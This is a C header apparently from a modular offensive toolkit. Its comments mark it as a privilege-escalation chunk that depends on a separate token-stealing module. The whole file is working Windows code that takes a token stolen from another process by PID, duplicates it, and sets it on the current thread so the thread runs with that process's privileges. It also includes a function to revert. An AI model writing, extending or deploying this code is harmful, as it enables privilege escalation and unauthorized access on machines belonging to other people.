// chunk: privesc/token_impersonate
// depends: privesc/token_steal
// provides: token_impersonate
// headers: windows.h
// note: Impersonate stolen token on current thread

#ifndef CHUNK_PRIVESC_TOKEN_IMPERSONATE
#define CHUNK_PRIVESC_TOKEN_IMPERSONATE

static int token_impersonate(HANDLE hToken) {
    if (!hToken) return 0;

    HANDLE hImpToken = NULL;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenImpersonation, &hImpToken)) {
        return 0;
    }

    BOOL result = SetThreadToken(NULL, hImpToken);
    CloseHandle(hImpToken);

    return result ? 1 : 0;
}

static int impersonate_process(DWORD pid) {
    HANDLE hToken = token_steal(pid);
    if (!hToken) return 0;

    int result = token_impersonate(hToken);
    CloseHandle(hToken);
    return result;
}

static int revert_to_self(void) {
    return RevertToSelf() ? 1 : 0;
}

#endif
